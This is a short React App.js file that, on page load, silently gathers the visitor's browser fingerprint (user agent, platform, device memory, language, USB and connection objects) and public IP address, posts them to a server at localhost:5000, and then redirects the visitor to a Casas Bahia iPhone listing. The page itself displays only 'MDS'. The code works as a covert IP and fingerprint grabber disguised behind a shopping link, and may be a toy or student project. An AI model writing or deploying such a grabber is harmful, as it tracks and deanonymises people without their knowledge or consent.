import "./App.css";
import axios from "axios";
const publicIp = require("public-ip");

const enviandoDados = async () => {
  const data = await axios({
    method: "post",
    url: "http://localhost:5000/",
    data: {
      appCodeName: navigator.appCodeName,
      appName: navigator.appName,
      appVersion: navigator.appVersion,
      connection: navigator.connection,
      cookieEnabled: navigator.cookieEnabled,
      deviceMemory: navigator.deviceMemory,
      language: navigator.language,
      userAgent: navigator.userAgent,
      usb: navigator.usb,
      virtualKeyboard: navigator.virtualKeyboard,
      userAgentData: navigator.userAgentData,
      platform: navigator.platform,
      pdfViewerEnabled: navigator.pdfViewerEnabled,
      ip: await publicIp.v4(),
    },
  });
  window.location.replace(
    "https://m.casasbahia.com.br/iphone-se-apple-64gb-preto-tela-de-4-7camera-de-12mp-ios-55014855.html?IdSku=55014855"
  );
  console.log(data);
};

enviandoDados();
function App() {
  return <div className="App">MDS</div>;
}

export default App;
